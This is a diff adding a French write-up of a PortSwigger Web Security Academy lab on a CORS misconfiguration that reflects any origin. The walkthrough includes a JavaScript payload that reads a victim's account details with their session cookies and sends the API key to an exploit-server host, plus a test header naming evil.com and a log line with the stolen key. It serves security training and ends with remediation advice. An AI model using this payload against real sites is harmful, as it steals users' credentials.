@@ -26,6 +26,7 @@ Labs résolus de la Web Security Academy : access control, authentification, SSR
 - [Lab 18 — Basic password reset poisoning](#lab-18--basic-password-reset-poisoning)
 - [Lab 19 — CSRF vulnerability with no defenses](#lab-19--csrf-vulnerability-with-no-defenses)
 - [Lab 20 — Basic clickjacking with CSRF token protection](#lab-20--basic-clickjacking-with-csrf-token-protection)
+- [Lab 21 — CORS vulnerability with basic origin reflection](#lab-21--cors-vulnerability-with-basic-origin-reflection)
 
 ---
 
@@ -813,5 +814,91 @@ trompeuse.
   navigateurs modernes.
 - Scripts de *frame-busting* côté client en défense complémentaire
   (jamais comme seule protection, car contournables).
+
+[⬆ Sommaire](#sommaire)
+
+## Lab 21 — CORS vulnerability with basic origin reflection
+
+**Catégorie :** CORS (Cross-Origin Resource Sharing)
+
+**Difficulté :** Apprentice
+
+This lab has an insecure CORS configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+**Identifiants :** `wiener:peter`
+
+**Contexte :**
+
+Le site expose un endpoint `/accountDetails` qui retourne des données sensibles (dont l'`apikey`) au format JSON, avec les headers suivants dans la réponse :
+
+    Access-Control-Allow-Origin: <origin de la requête>
+    Access-Control-Allow-Credentials: true
+
+Le serveur reflète aveuglément n'importe quelle origine dans `Access-Control-Allow-Origin`. Combiné à `Access-Control-Allow-Credentials: true`, cela permet à un site tiers de lire la réponse cross-origin avec les cookies de session de la victime — exposant ainsi des données privées.
+
+**Résolution :**
+
+**Étape 1 — Identifier le champ sensible**
+
+Se connecter avec `wiener:peter` et accéder à :
+
+    /accountDetails
+
+La réponse JSON retourne :
+
+    {
+      "username": "wiener",
+      "email": "",
+      "apikey": "zPWeYW9yjHY1Auk4Okx2SeKlcaRCLkka",
+      "sessions": ["..."]
+    }
+
+**Étape 2 — Confirmer la vulnérabilité**
+
+Dans Burp Suite, ajouter le header `Origin: https://evil.com` à la requête vers `/accountDetails`. La réponse reflète :
+
+    Access-Control-Allow-Origin: https://evil.com
+    Access-Control-Allow-Credentials: true
+
+→ Vulnérable ✅
+
+**Étape 3 — Payload sur le serveur d'exploit**
+
+Sur le serveur d'exploit, coller dans le body :
+
+```html
+<script>
+  fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
+    credentials: "include"
+  })
+  .then(r => r.json())
+  .then(data => {
+    fetch("https://EXPLOIT-SERVER.exploit-server.net/log?key=" + data.apikey)
+  })
+</script>
+```
+
+⚠️ Le champ s'appelle `apikey` (tout en minuscules) — pas `apiKey`.
+
+**Étape 4 — Deliver to victim**
+
+Cliquer **Deliver exploit to victim**, puis consulter l'**Access log** du serveur d'exploit. Une requête de `10.0.4.x` (la victime) apparaît :
+
+    GET /log?key=OChRQPq4UqhmsHIvQtywQxHHPcwgCnzE HTTP/1.1
+
+**Étape 5 — Soumettre la solution**
+
+Copier l'API key et la soumettre dans le lab → résolu ✅
+
+**Pourquoi ça marche :**
+
+Le navigateur attache automatiquement les cookies de session à la requête `fetch` grâce à `credentials: "include"`. Comme le serveur répond avec `Access-Control-Allow-Origin` égal à l'origine de l'exploit server et `Access-Control-Allow-Credentials: true`, le navigateur de la victime autorise le script à lire la réponse cross-origin — exposant l'`apikey` de l'admin.
+
+**Remédiation :**
+
+- Ne jamais refléter aveuglément le header `Origin` reçu dans `Access-Control-Allow-Origin`.
+- Maintenir une liste blanche stricte des origines autorisées.
+- Éviter de combiner `Access-Control-Allow-Credentials: true` avec une politique CORS permissive.
+- Ne jamais autoriser `Access-Control-Allow-Origin: *` avec des credentials.
 
 [⬆ Sommaire](#sommaire)
